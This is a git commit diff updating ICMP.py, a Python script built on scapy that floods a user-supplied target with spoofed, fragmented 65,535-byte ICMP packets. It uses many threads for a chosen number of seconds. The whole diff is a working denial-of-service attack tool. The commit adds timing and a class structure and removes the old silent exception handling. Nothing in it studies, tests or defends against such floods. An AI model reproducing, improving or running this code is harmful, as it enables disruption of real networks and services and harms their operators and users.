fe9ccdb76b7c199795af79f7041020cddc812008
Misfortune <36631640+LawOfTime@users.noreply.github.com>
2019-06-02 15:56:30 +0100

    Update ICMP.py

--- ICMP.py
+++ ICMP.py
@@ -1,21 +1,41 @@
+import time
+import random
 import threading
 from scapy.all import *
 
-try:
-	ip = raw_input("Target: ")
-	altIP = raw_input("Spoofed IP: ")
-	threads = input("Threads: ")
+ip = input("Target: ")
+spoof = input("Spoofed IP: ")
+threads = int(input("Threads: "))
+timer = float(input("Time(S): "))
 
-	def icmpflood():
-		try:
-			while True:
-				packet = IP(src=ip, dst=altIP)/ICMP()/("Z" * 65535)
-				send(fragment(packet), loop=1, verbose=0)
-		except:
-			pass
+class main:
+	def __init__(self, ip, threads, spoof, timer):
+		self.ip = ip
+		self.spoof = spoof
+		self.threads = threads
+		self.timer = timer
+		
+		self.timeout = time.time() + 1 * self.timer
+		
+		self.init_flood()
+		self.wait()
 
-	for i in range(int(threads)):
-		thread = threading.Thread(target=icmpflood)
-		thread.start()
-except:
-	pass
+	def init_flood(self):
+		for i in range(self.threads):
+			threading.Thread(target=self.flood, daemon=True).start()
+
+	def flood(self):
+		while time.time() < self.timeout:
+			packet = IP(src=self.ip, dst=self.spoof)/ICMP()/("Z" * 65535)
+			send(fragment(packet), loop=1, verbose=0)
+
+	def wait(self):
+		while time.time() < self.timeout:
+			try:
+				time.sleep(1)
+			except KeyboardInterrupt:
+				print("Quitting.")
+				break
+
+if __name__ == "__main__":
+	main(ip, spoof, threads, timer)
